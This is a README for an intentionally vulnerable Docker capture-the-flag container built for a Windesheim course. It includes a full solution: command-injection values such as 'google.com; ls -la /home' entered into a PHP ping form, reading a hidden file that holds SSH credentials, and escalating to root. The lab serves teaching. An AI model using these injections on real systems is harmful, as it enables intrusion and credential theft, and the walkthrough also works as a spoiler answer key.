# CTFD Windesheim
Voor de opdracht Techniek in de praktijk D, is deze vulnarable docker image gemaakt.

# Perpose of this docker container

##pInject
the perpose of this container is to teach people how to hack using ssh.
The container is hosting a very minimal php program which allows you to ping and check if a domain or ip is "online".
First the student or player needs to nmap the host and discover that ports 2222 and 8080 are open.
Port 8080 represents the webapplication
Port 2222 represents ssh 
One can inject a command after the domain or ip one wants to ping. For example:
```
google.com; ls -l
```
U can inject a command after the domain or ip you want to ping. For example:

# How To solve this container
Oke, oke, don’t mention to your students or players that you are hosting our container, because the following information will let them solve this puzzle very quickly....
There are two hidden flags.

```
google.com; ls -la /home #Will output the content of the /home dir
```
There you will find a user "kaas".
Go deeper into the home of kaas.
```
google.com; ls -la /home/kaas
```
You will find a hidden file called .oldPassFile.
This file contains two things:
1.	a flag
2.	credentials to log in with ssh
```
ssh -p 2222 kaas@"yourContainersHostIpAddress"
```
Now you are inside the system.
In the .ssh folder, you can find a configuration which will allow you to login to the root on the same system.
There you can find the second flag in a file called youMadeIt

# Run this image
```
docker build -t windesheim-tidpd .
docker run -d -p 2222:22 -p 8080:80 --name ctf-container windesheim-tidpd
```

## Explained ports
|Port | Purpose | Desciption |
|--|--|--|
|8080 | exposed port for apache2 webApp | Application via web for check if site is reachable via ping commands |
|2222 | exposed port for ssh deamon | Ssh running in the container can be reached via this exposed port |

